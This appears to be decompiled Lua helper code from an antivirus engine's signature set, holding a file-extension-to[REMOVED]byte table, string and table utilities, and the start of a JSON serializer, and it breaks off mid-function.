-- Threat: !InfrastructureShared
-- Name: LuaFuncHelper
-- Type: 1

-- Fallback: local variables were not recovered, registers are shown instead

local L0_1, L1_1, L2_1, L3_1, L4_1, L5_1, L6_1, L7_1, L8_1, L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1

function L0_1(A0_2)
  local L1_2, L2_2
  L2_2 = A0_2
  L1_2 = A0_2.lower
  L1_2 = L1_2(L2_2)
  A0_2 = L1_2
  L1_2 = {}
  L1_2[".acm"] = "\\x4d\\x5a"
  L1_2[".ax"] = "\\x4d\\x5a"
  L1_2[".cpl"] = "\\x4d\\x5a"
  L1_2[".dll"] = "\\x4d\\x5a"
  L1_2[".drv"] = "\\x4d\\x5a"
  L1_2[".efi"] = "\\x4d\\x5a"
  L1_2[".exe"] = "\\x4d\\x5a"
  L1_2[".mui"] = "\\x4d\\x5a"
  L1_2[".ocx"] = "\\x4d\\x5a"
  L1_2[".scr"] = "\\x4d\\x5a"
  L1_2[".sys"] = "\\x4d\\x5a"
  L1_2[".tsp"] = "\\x4d\\x5a"
  L1_2[".xml"] = "\\x3c\\x3f"
  L1_2[".bmp"] = "\\x42\\x4d"
  L1_2[".bz2"] = "\\x42\\x5a"
  L1_2[".tbz"] = "\\x42\\x5a"
  L1_2[".jpg"] = "\\xff\\xd8"
  L1_2[".jpeg"] = "\\xff\\xd8"
  L1_2[".zip"] = "\\x50\\x4b"
  L1_2[".docx"] = "\\x50\\x4b"
  L1_2[".docm"] = "\\x50\\x4b"
  L1_2[".dotx"] = "\\x50\\x4b"
  L1_2[".dotm"] = "\\x50\\x4b"
  L1_2[".xlsx"] = "\\x50\\x4b"
  L1_2[".xlsm"] = "\\x50\\x4b"
  L1_2[".xlam"] = "\\x50\\x4b"
  L1_2[".xltm"] = "\\x50\\x4b"
  L1_2[".pptx"] = "\\x50\\x4b"
  L1_2[".pptm"] = "\\x50\\x4b"
  L1_2[".appx"] = "\\x50\\x4b"
  L1_2[".sh"] = "\\x23\\x21"
  L1_2[".mp3"] = "\\x49\\x44"
  L1_2[".swf"] = "\\x46\\x57"
  L1_2[".flv"] = "\\x46\\x4c"
  L1_2[".ogg"] = "\\x4f\\x67"
  L1_2[".gz"] = "\\x1f\\x8b"
  L1_2[".mp4"] = "\\x00\\x00"
  L1_2[".gzip"] = "\\x1f\\x8b"
  L1_2[".tgz"] = "\\x1f\\x8b"
  L1_2[".slk"] = "\\x49\\x44"
  L1_2[".tiff"] = "\\x4d\\x4d\\x00\\x2a"
  L1_2[".cab"] = "\\x4d\\x53\\x43\\x46"
  L1_2[".mid"] = "\\x4d\\x54\\x68\\x64"
  L1_2[".midi"] = "\\x4d\\x54\\x68\\x64"
  L1_2[".dmp"] = "\\x4d\\x44\\x4d\\x50"
  L1_2[".mdmp"] = "\\x4d\\x44\\x4d\\x50"
  L1_2[".doc"] = "\\xd0\\xcf\\x11\\xe0"
  L1_2[".xls"] = "\\xd0\\xcf\\x11\\xe0"
  L1_2[".ppt"] = "\\xd0\\xcf\\x11\\xe0"
  L1_2[".msi"] = "\\xd0\\xcf\\x11\\xe0"
  L1_2[".msg"] = "\\xd0\\xcf\\x11\\xe0"
  L1_2[".png"] = "\\x89\\x50\\x4e\\x47"
  L1_2[".gif"] = "\\x47\\x49\\x46\\x38"
  L1_2[".woff"] = "\\x77\\x4f\\x46\\x46"
  L1_2[".rar"] = "\\x52\\x61\\x72\\x21"
  L1_2[".7z"] = "\\x37\\x7a\\xbc\\xaf"
  L1_2[".7zip"] = "\\x37\\x7a\\xbc\\xaf"
  L1_2[".crx"] = "\\x43\\x72\\x32\\x34"
  L1_2[".ttf"] = "\\x00\\x01\\x00\\x00"
  L1_2[".dex"] = "\\x64\\x65\\x78\\x0a"
  L1_2[".deb"] = "\\x21\\x3c\\x61\\x72"
  L1_2[".pst"] = "\\x21\\x42\\x44\\x4e"
  L1_2[".vbe"] = "\\x23\\x40\\x7e\\x5e"
  L1_2[".dwg"] = "\\x41\\x43\\x31\\x30"
  L1_2[".riff"] = "\\x52\\x49\\x46\\x46"
  L1_2[".webp"] = "\\x52\\x49\\x46\\x46"
  L1_2[".sis"] = "\\x7a\\x1a\\x20\\x10"
  L1_2[".sisx"] = "\\x7a\\x1a\\x20\\x10"
  L1_2[".lnk"] = "\\x4c\\x00\\x00\\x00"
  L1_2[".arw"] = "\\x49\\x49\\x2a\\x00"
  L1_2[".nef"] = "\\x49\\x49\\x2a\\x00"
  L1_2[".cr2"] = "\\x49\\x49\\x2a\\x00"
  L1_2[".rw2"] = "\\x49\\x49\\x55\\x00"
  L1_2[".psd"] = "\\x38\\x42\\x50\\x53"
  L1_2[".w3n"] = "\\x48\\x4d\\x33\\x57"
  L1_2[".rtf"] = "\\x7b\\x5c\\x72\\x74"
  L1_2[".pdf"] = "\\x25\\x50\\x44\\x46"
  L1_2[".sqlite"] = "\\x53\\x51\\x4c\\x69"
  L1_2[".sqlite3"] = "\\x53\\x51\\x4c\\x69"
  L1_2[".s3db"] = "\\x53\\x51\\x4c\\x69"
  L1_2[".pnf"] = "\\x01\\x03\\x02\\x00"
  L1_2[".class"] = "\\xca\\xfe\\xba\\xbe"
  L1_2[".jsp"] = "\\xca\\xfe\\xba\\xbe"
  L2_2 = L1_2[A0_2]
  return L2_2
end

function L1_1(A0_2)
  local L1_2, L2_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 == "bool" then
    return A0_2
  end
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 == "string" then
    if A0_2 == "true" then
      L1_2 = true
      return L1_2
    end
    if A0_2 == "false" then
      L1_2 = false
      return L1_2
    end
  end
end

function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = tonumber
  L2_2 = string
  L2_2 = L2_2.format
  L3_2 = "%.f"
  L4_2 = A0_2
  L2_2, L3_2, L4_2 = L2_2(L3_2, L4_2)
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  if A0_2 > L1_2 then
    L1_2 = L1_2 + 1
  end
  return L1_2
end

function L3_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = 0
  while A0_2 ~= 0 do
    L2_2 = mp
    L2_2 = L2_2.shr32
    L3_2 = A0_2
    L4_2 = 1
    L2_2 = L2_2(L3_2, L4_2)
    A0_2 = L2_2
    L1_2 = L1_2 + 1
  end
  return L1_2
end

function L4_1(A0_2)
  local L1_2
  L1_2 = 0
  if 0 <= A0_2 and A0_2 < 1 then
    L1_2 = 0
  elseif 1 <= A0_2 and A0_2 < 2 then
    L1_2 = 1
  elseif 2 <= A0_2 and A0_2 < 6 then
    L1_2 = 2
  elseif 6 <= A0_2 and A0_2 < 12 then
    L1_2 = 3
  elseif 12 <= A0_2 and A0_2 < 20 then
    L1_2 = 4
  elseif 20 <= A0_2 and A0_2 < 30 then
    L1_2 = 5
  elseif 30 <= A0_2 and A0_2 < 42 then
    L1_2 = 6
  elseif 42 <= A0_2 and A0_2 < 56 then
    L1_2 = 7
  elseif 56 <= A0_2 and A0_2 < 72 then
    L1_2 = 8
  elseif 72 <= A0_2 and A0_2 < 90 then
    L1_2 = 9
  elseif 90 <= A0_2 and A0_2 < 110 then
    L1_2 = 10
  elseif 110 <= A0_2 and A0_2 < 132 then
    L1_2 = 11
  elseif 132 <= A0_2 and A0_2 < 156 then
    L1_2 = 12
  elseif 156 <= A0_2 and A0_2 < 182 then
    L1_2 = 13
  elseif 182 <= A0_2 and A0_2 < 210 then
    L1_2 = 14
  elseif 210 <= A0_2 and A0_2 < 240 then
    L1_2 = 15
  elseif 240 <= A0_2 and A0_2 < 272 then
    L1_2 = 16
  elseif 272 <= A0_2 and A0_2 < 306 then
    L1_2 = 17
  elseif 306 <= A0_2 and A0_2 < 342 then
    L1_2 = 18
  elseif 342 <= A0_2 and A0_2 < 380 then
    L1_2 = 19
  elseif 380 <= A0_2 and A0_2 < 420 then
    L1_2 = 20
  end
  return L1_2
end

function L5_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  if not A1_2 then
    A1_2 = " "
  end
  L2_2 = string
  L2_2 = L2_2.gsub
  L3_2 = A0_2
  L4_2 = "^(["
  L5_2 = A1_2
  L6_2 = "]+)"
  L4_2 = L4_2 .. L5_2 .. L6_2
  L5_2 = ""
  return L2_2(L3_2, L4_2, L5_2)
end

function L6_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  if not A1_2 then
    A1_2 = " "
  end
  L2_2 = string
  L2_2 = L2_2.gsub
  L3_2 = A0_2
  L4_2 = "(["
  L5_2 = A1_2
  L6_2 = "]+)$"
  L4_2 = L4_2 .. L5_2 .. L6_2
  L5_2 = ""
  return L2_2(L3_2, L4_2, L5_2)
end

function L7_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = 0
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2 = L2_2(L3_2)
  for L5_2, L6_2 in L2_2, L3_2, L4_2 do
    L7_2 = type
    L8_2 = L5_2
    L7_2 = L7_2(L8_2)
    if L7_2 == "number" then
      L7_2 = tostring
      L8_2 = L5_2
      L7_2 = L7_2(L8_2)
      L5_2 = L7_2
    end
    L7_2 = #L5_2
    if L1_2 < L7_2 then
      L1_2 = #L5_2
    end
  end
  return L1_2
end

function L8_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  L2_2 = string
  L2_2 = L2_2.rep
  L3_2 = A0_2
  L4_2 = A1_2
  return L2_2(L3_2, L4_2)
end

function L9_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  if A0_2 == nil then
    L2_2 = false
    return L2_2
  end
  L2_2 = type
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if L2_2 ~= "table" then
    L2_2 = {}
    A1_2 = L2_2
  end
  L2_2 = MpCommon
  L2_2 = L2_2.GetPersistContextCount
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if 0 <= L2_2 and L2_2 <= 30 then
    L3_2 = MpCommon
    L3_2 = L3_2.GetPersistContext
    L4_2 = A0_2
    L3_2 = L3_2(L4_2)
    L4_2 = nil
    L5_2 = nil
    L6_2 = ipairs
    L7_2 = L3_2
    L6_2, L7_2, L8_2 = L6_2(L7_2)
    for L9_2, L10_2 in L6_2, L7_2, L8_2 do
      L11_2 = "|"
      L13_2 = L10_2
      L12_2 = L10_2.sub
      L14_2 = 12
      L15_2 = 16
      L12_2 = L12_2(L13_2, L14_2, L15_2)
      L13_2 = "|"
      L5_2 = L11_2 .. L12_2 .. L13_2
      L11_2 = "|OFFAR|WARCH|OFFEM|"
      L13_2 = L11_2
      L12_2 = L11_2.find
      L14_2 = L5_2
      L15_2 = 1
      L16_2 = true
      L12_2 = L12_2(L13_2, L14_2, L15_2, L16_2)
      if L12_2 then
        L4_2 = L10_2
        break
      end
    end
    if L4_2 == nil then
      L6_2 = false
      return L6_2
    end
    L7_2 = L4_2
    L6_2 = L4_2.sub
    L8_2 = 19
    L9_2 = -1
    L6_2 = L6_2(L7_2, L8_2, L9_2)
    L4_2 = L6_2
    L6_2 = {}
    L7_2 = split
    L8_2 = L4_2
    L9_2 = ";"
    L7_2 = L7_2(L8_2, L9_2)
    if L7_2 then
      L8_2 = ipairs
      L9_2 = L7_2
      L8_2, L9_2, L10_2 = L8_2(L9_2)
      for L11_2, L12_2 in L8_2, L9_2, L10_2 do
        L13_2 = kvsplit
        L14_2 = L12_2
        L15_2 = "="
        L16_2 = A1_2
        L13_2(L14_2, L15_2, L16_2)
      end
    end
    L8_2 = A1_2.ProcessImagePath
    if L8_2 == nil then
      L8_2 = false
      return L8_2
    end
    L8_2 = true
    return L8_2
  end
  L3_2 = false
  return L3_2
end

function L10_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 ~= "string" then
    L2_2 = tostring
    L3_2 = A0_2
    L2_2 = L2_2(L3_2)
    A0_2 = L2_2
  end
  L2_2 = #A0_2
  if A1_2 < L2_2 then
    return A0_2
  else
    L2_2 = L8_1
    L3_2 = " "
    L4_2 = #A0_2
    L4_2 = A1_2 - L4_2
    L2_2 = L2_2(L3_2, L4_2)
    L3_2 = A0_2
    L4_2 = L2_2
    L3_2 = L3_2 .. L4_2
    return L3_2
  end
end

function L11_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  if A0_2 then
    L2_2 = #A0_2
    if L2_2 ~= 0 then
      goto lbl_7
    end
  end
  do return A0_2 end
  ::lbl_7::
  L2_2 = L8_1
  L3_2 = A0_2
  L4_2 = L2_1
  L5_2 = #A0_2
  L5_2 = A1_2 / L5_2
  L4_2, L5_2 = L4_2(L5_2)
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L3_2 = string
  L3_2 = L3_2.sub
  L4_2 = L2_2
  L5_2 = A1_2
  return L3_2(L4_2, L5_2)
end

function L12_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L4_2 = 1
  L5_2 = 2
  L6_2 = 3
  L7_2 = type
  L8_2 = A0_2
  L7_2 = L7_2(L8_2)
  if L7_2 ~= "string" then
    L7_2 = tostring
    L8_2 = A0_2
    L7_2 = L7_2(L8_2)
    A0_2 = L7_2
  end
  if not A2_2 then
    A2_2 = " "
  end
  if not A3_2 then
    A3_2 = L4_2
  end
  L7_2 = #A0_2
  if A1_2 < L7_2 then
    return A0_2
  else
    L7_2 = #A0_2
    L7_2 = A1_2 - L7_2
    if A3_2 == L6_2 then
      L8_2 = ""
      L9_2 = ""
      L10_2 = math_floor
      L11_2 = L7_2 / 2
      L10_2 = L10_2(L11_2)
      L11_2 = L11_1
      L12_2 = A2_2
      L13_2 = L10_2
      L11_2 = L11_2(L12_2, L13_2)
      L8_2 = L11_2
      L11_2 = L11_1
      L12_2 = A2_2
      L13_2 = L7_2 % 2
      L13_2 = L10_2 + L13_2
      L11_2 = L11_2(L12_2, L13_2)
      L9_2 = L11_2
      L11_2 = L8_2
      L12_2 = A0_2
      L13_2 = L9_2
      L11_2 = L11_2 .. L12_2 .. L13_2
      return L11_2
    elseif A3_2 == L5_2 then
      L8_2 = L11_1
      L9_2 = A2_2
      L10_2 = L7_2
      L8_2 = L8_2(L9_2, L10_2)
      L9_2 = L8_2
      L10_2 = A0_2
      L9_2 = L9_2 .. L10_2
      return L9_2
    else
      L8_2 = L11_1
      L9_2 = A2_2
      L10_2 = L7_2
      L8_2 = L8_2(L9_2, L10_2)
      L9_2 = A0_2
      L10_2 = L8_2
      L9_2 = L9_2 .. L10_2
      return L9_2
    end
    return A0_2
  end
end

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = #A0_2
  if A1_2 >= L2_2 then
    L3_2 = {}
    L4_2 = A0_2
    L3_2[1] = L4_2
    return L3_2
  end
  L3_2 = {}
  L4_2 = {}
  L5_2 = 0
  L6_2 = 1
  L7_2 = L2_2
  L8_2 = 1
  for L9_2 = L6_2, L7_2, L8_2 do
    L5_2 = L5_2 + 1
    L10_2 = A0_2[L9_2]
    L4_2[L5_2] = L10_2
    if L5_2 == A1_2 or L9_2 == L2_2 then
      L10_2 = #L3_2
      L10_2 = L10_2 + 1
      L3_2[L10_2] = L4_2
      L10_2 = {}
      L5_2 = 0
      L4_2 = L10_2
    end
  end
  return L3_2
end

table_split_chunks = L13_1

function L13_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  if A2_2 == nil then
    A2_2 = false
  end
  if A2_2 then
    L3_2 = string
    L3_2 = L3_2.lower
    L4_2 = A1_2
    L3_2 = L3_2(L4_2)
    A1_2 = L3_2
  end
  L3_2 = ipairs
  L4_2 = A0_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    if A2_2 then
      L8_2 = string
      L8_2 = L8_2.lower
      L9_2 = L7_2
      L8_2 = L8_2(L9_2)
      L7_2 = L8_2 or L7_2
      if not L8_2 then
      end
    end
    L8_2 = string
    L8_2 = L8_2.find
    L9_2 = L7_2
    L10_2 = A1_2
    L11_2 = 1
    L12_2 = true
    L8_2 = L8_2(L9_2, L10_2, L11_2, L12_2)
    if L8_2 then
      return L6_2
    end
  end
  L3_2 = false
  return L3_2
end

table_contains = L13_1

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L3_2 = A0_2
  L2_2 = A0_2.lower
  L2_2 = L2_2(L3_2)
  A0_2 = L2_2
  L3_2 = A1_2
  L2_2 = A1_2.lower
  L2_2 = L2_2(L3_2)
  A1_2 = L2_2
  L2_2 = L0_1
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = #A1_2
  if L3_2 < 8 or L2_2 == nil then
    L3_2 = nil
    return L3_2
  end
  L3_2 = #L2_2
  L4_2 = #A1_2
  if L3_2 <= L4_2 then
    L3_2 = string
    L3_2 = L3_2.sub
    L4_2 = A1_2
    L5_2 = 1
    L6_2 = #L2_2
    L3_2 = L3_2(L4_2, L5_2, L6_2)
    if L3_2 ~= L2_2 then
      L3_2 = true
      return L3_2
    end
  else
    L3_2 = string
    L3_2 = L3_2.sub
    L4_2 = L2_2
    L5_2 = 1
    L6_2 = #A1_2
    L3_2 = L3_2(L4_2, L5_2, L6_2)
    if L3_2 ~= A1_2 then
      L3_2 = true
      return L3_2
    end
  end
  L3_2 = false
  return L3_2
end

ExtensionToMagicMismatch = L13_1

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2 = L2_2(L3_2)
  for L5_2, L6_2 in L2_2, L3_2, L4_2 do
    if L6_2 == A1_2 then
      return L5_2
    end
  end
  L2_2 = false
  return L2_2
end

in_array = L13_1

function L13_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = {}
  L2_2 = {}
  L3_2 = ipairs
  L4_2 = A0_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    L8_2 = L1_2[L7_2]
    if not L8_2 then
      L8_2 = #L2_2
      L8_2 = L8_2 + 1
      L2_2[L8_2] = L7_2
      L1_2[L7_2] = true
    end
  end
  return L2_2
end

table_dedup = L13_1

function L13_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = {}
  L2_2 = {}
  L3_2 = ipairs
  L4_2 = A0_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    L8_2 = string
    L8_2 = L8_2.lower
    L9_2 = L7_2
    L8_2 = L8_2(L9_2)
    L7_2 = L8_2
    L8_2 = L1_2[L7_2]
    if not L8_2 then
      L8_2 = #L2_2
      L8_2 = L8_2 + 1
      L2_2[L8_2] = L7_2
      L1_2[L7_2] = true
    end
  end
  return L2_2
end

table_dedup_caseinsensitive = L13_1

function L13_1(...)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L1_2 = {}
  L2_2 = ipairs
  L3_2 = {}
  L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = ...
  L3_2[1] = L4_2
  L3_2[2] = L5_2
  L3_2[3] = L6_2
  L3_2[4] = L7_2
  L3_2[5] = L8_2
  L3_2[6] = L9_2
  L3_2[7] = L10_2
  L3_2[8] = L11_2
  L3_2[9] = L12_2
  L2_2, L3_2, L4_2 = L2_2(L3_2)
  for L5_2, L6_2 in L2_2, L3_2, L4_2 do
    L7_2 = 1
    L8_2 = #L6_2
    L9_2 = 1
    for L10_2 = L7_2, L8_2, L9_2 do
      L11_2 = #L1_2
      L11_2 = L11_2 + 1
      L12_2 = L6_2[L10_2]
      L1_2[L11_2] = L12_2
    end
  end
  return L1_2
end

table_merge = L13_1

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  if not A1_2 then
    L2_2 = {}
    A1_2 = L2_2
  end
  if A0_2 then
    L2_2 = pairs
    L3_2 = A0_2
    L2_2, L3_2, L4_2 = L2_2(L3_2)
    for L5_2, L6_2 in L2_2, L3_2, L4_2 do
      A1_2[L6_2] = 0
    end
  end
  return A1_2
end

convert_to_hashtable = L13_1

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  if not A1_2 then
    L2_2 = {}
    A1_2 = L2_2
  end
  L2_2 = nil
  L3_2 = type
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if L3_2 == "table" then
    L3_2 = A1_2[A0_2]
    if L3_2 then
      L2_2 = A1_2[A0_2]
    else
      L3_2 = {}
      L2_2 = L3_2
      A1_2[A0_2] = L2_2
      L3_2 = next
      L4_2 = A0_2
      L5_2 = nil
      for L6_2, L7_2 in L3_2, L4_2, L5_2 do
        L8_2 = deepCopy
        L9_2 = L6_2
        L10_2 = A1_2
        L8_2 = L8_2(L9_2, L10_2)
        L9_2 = deepCopy
        L10_2 = L7_2
        L11_2 = A1_2
        L9_2 = L9_2(L10_2, L11_2)
        L2_2[L8_2] = L9_2
      end
    end
  else
    L2_2 = A0_2
  end
  return L2_2
end

deepCopy = L13_1

function L13_1(...)
  local L1_2, L2_2
  L1_2 = {}
  L2_2 = ...
  L1_2[1] = L2_2
  return L1_2
end

table_pack = L13_1

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  if not A1_2 then
    A1_2 = 1
  end
  L2_2 = A0_2[A1_2]
  if L2_2 ~= nil then
    L2_2 = A0_2[A1_2]
    L3_2 = table_unpack
    L4_2 = A0_2
    L5_2 = A1_2 + 1
    L3_2, L4_2, L5_2 = L3_2(L4_2, L5_2)
    return L2_2, L3_2, L4_2, L5_2
  end
end

table_unpack = L13_1

function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2
  if A0_2 ~= nil then
    L2_2 = type
    L3_2 = A0_2
    L2_2 = L2_2(L3_2)
    if L2_2 == "table" and A1_2 ~= nil then
      L2_2 = type
      L3_2 = A1_2
      L2_2 = L2_2(L3_2)
      if L2_2 == "table" then
        goto lbl_17
      end
    end
  end
  L2_2 = 0
  do return L2_2 end
  ::lbl_17::
  L2_2 = #A0_2
  if 256 < L2_2 then
    L2_2 = 0
    return L2_2
  end
  L2_2 = #A1_2
  L2_2 = L2_2 % 2
  if L2_2 ~= 0 then
    L2_2 = 0
    return L2_2
  end
  L2_2 = {}
  L3_2 = ipairs
  L4_2 = A0_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    L8_2 = 0
    L9_2 = 1
    L10_2 = #A1_2
    L11_2 = 2
    for L12_2 = L9_2, L10_2, L11_2 do
      L13_2 = A1_2[L12_2]
      L14_2 = L12_2 + 1
      L14_2 = A1_2[L14_2]
      if L13_2 ~= nil then
        L15_2 = L7_2[L13_2]
        if L15_2 ~= nil and L14_2 ~= nil then
          L15_2 = type
          L16_2 = L14_2
          L15_2 = L15_2(L16_2)
          if L15_2 == "string" then
            L15_2 = string
            L15_2 = L15_2.find
            L16_2 = string
            L16_2 = L16_2.lower
            L17_2 = L7_2[L13_2]
            L16_2 = L16_2(L17_2)
            L17_2 = string
            L17_2 = L17_2.lower
            L18_2 = L14_2
            L17_2 = L17_2(L18_2)
            L18_2 = 1
            L19_2 = true
            L15_2 = L15_2(L16_2, L17_2, L18_2, L19_2)
            if L15_2 then
              L8_2 = L8_2 + 1
            end
          else
            L15_2 = L7_2[L13_2]
            if L15_2 == L14_2 then
              L8_2 = L8_2 + 1
            end
          end
        end
      end
    end
    L9_2 = #A1_2
    L9_2 = L9_2 / 2
    if L8_2 == L9_2 then
      L9_2 = table
      L9_2 = L9_2.insert
      L10_2 = L2_2
      L11_2 = L7_2
      L9_2(L10_2, L11_2)
    end
  end
  return L2_2
end

table_ipairs_filter = L13_1

function L13_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = {}
  L1_2["\\"] = "\\\\"
  L1_2["\""] = "\\\""
  L1_2["\b"] = "\\b"
  L1_2["\f"] = "\\f"
  L1_2["\n"] = "\\n"
  L1_2["\r"] = "\\r"
  L1_2["\t"] = "\\t"
  L2_2 = L1_2[A0_2]
  if not L2_2 then
    L2_2 = string
    L2_2 = L2_2.format
    L3_2 = "\\u%04x"
    L5_2 = A0_2
    L4_2 = A0_2.byte
    L4_2, L5_2 = L4_2(L5_2)
    L2_2 = L2_2(L3_2, L4_2, L5_2)
  end
  return L2_2
end

function L14_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = "\""
  L2_2 = string
  L2_2 = L2_2.gsub
  L3_2 = A0_2
  L4_2 = "[%z\001-\031\\\"]"
  L5_2 = L13_1
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L3_2 = "\""
  L1_2 = L1_2 .. L2_2 .. L3_2
  return L1_2
end

function L15_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = string
  L1_2 = L1_2.format
  L2_2 = "%.14g"
  L3_2 = A0_2
  return L1_2(L2_2, L3_2)
end

function L16_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  if A0_2 == nil then
    L1_2 = "null"
    return L1_2
  end
  L1_2 = {}
  L2_2 = L14_1
  L1_2.string = L2_2
  L2_2 = L15_1
  L1_2.number = L2_2
  L2_2 = tostring
  L1_2.boolean = L2_2
  L2_2 = tostring
  L1_2["function"] = L2_2
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = L1_2[L2_2]
  if not L3_2 then
    L3_2 = tostring
  end
  L4_2 = L3_2
  L5_2 = A0_2
  return L4_2(L5_2)
end

function L17_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2
  if A0_2 == nil then
    L4_2 = "null"
    return L4_2
  end
  L4_2 = ""
  if not A2_2 then
    L5_2 = {}
    A2_2 = L5_2
  end
  L5_2 = A2_2[A0_2]
  if L5_2 then
    L5_2 = L4_2
    L6_2 = "\"circular reference\""
    L4_2 = L5_2 .. L6_2
  end
  A2_2[A0_2] = true
  if A1_2 then
    L5_2 = ""
    if L5_2 then
      goto lbl_23
    end
  end
  L5_2 = "\r\n"
  ::lbl_23::
  L6_2 = type
  L7_2 = A0_2
  L6_2 = L6_2(L7_2)
  if L6_2 == "table" then
    L7_2 = ""
    if A1_2 then
      L8_2 = ""
      if L8_2 then
        goto lbl_35
      end
    end
    L8_2 = "  "
    ::lbl_35::
    L9_2 = ""
    L10_2 = 0
    if not A3_2 then
      A3_2 = 0
    elseif not A1_2 then
      L11_2 = L8_1
      L12_2 = L8_2
      L13_2 = A3_2
      L11_2 = L11_2(L12_2, L13_2)
      L9_2 = L11_2
      L11_2 = L9_2
      L12_2 = L8_2
      L7_2 = L11_2 .. L12_2
    end
    if A1_2 then
      L11_2 = 0
      if L11_2 then
        goto lbl_60
      end
    end
    L11_2 = L7_1
    L12_2 = A0_2
    L11_2 = L11_2(L12_2)
    L11_2 = L11_2 + 3
    ::lbl_60::
    L12_2 = rawget
    L13_2 = A0_2
    L14_2 = 1
    L12_2 = L12_2(L13_2, L14_2)
    if L12_2 == nil then
      L12_2 = next
      L13_2 = A0_2
      L12_2 = L12_2(L13_2)
      if L12_2 ~= nil then
        goto lbl_148
      end
    end
    if A3_2 == 0 then
      L12_2 = L4_2
      L13_2 = L7_2
      L14_2 = "["
      L4_2 = L12_2 .. L13_2 .. L14_2
    else
      L12_2 = L4_2
      L13_2 = L7_2
      L4_2 = L12_2 .. L13_2
    end
    L12_2 = ipairs
    L13_2 = A0_2
    L12_2, L13_2, L14_2 = L12_2(L13_2)
    for L15_2, L16_2 in L12_2, L13_2, L14_2 do
      if 1 < L15_2 then
        L17_2 = L4_2
        L18_2 = ","
        if A1_2 then
          L19_2 = ""
          if L19_2 then
            goto lbl_95
          end
        end
        L19_2 = " "
        ::lbl_95::
        L4_2 = L17_2 .. L18_2 .. L19_2
      end
      L17_2 = type
      L18_2 = L16_2
      L17_2 = L17_2(L18_2)
      if L17_2 == "table" then
        L17_2 = L4_2
        L18_2 = string
        L18_2 = L18_2.format
        L19_2 = "{"
        L20_2 = L7_2
        L21_2 = L8_2
        L18_2 = L18_2(L19_2, L20_2, L21_2)
        L4_2 = L17_2 .. L18_2
        L17_2 = rawget
        L18_2 = L16_2
        L19_2 = 1
        L17_2 = L17_2(L18_2, L19_2)
        if L17_2 == nil then
          L17_2 = next
          L18_2 = L16_2
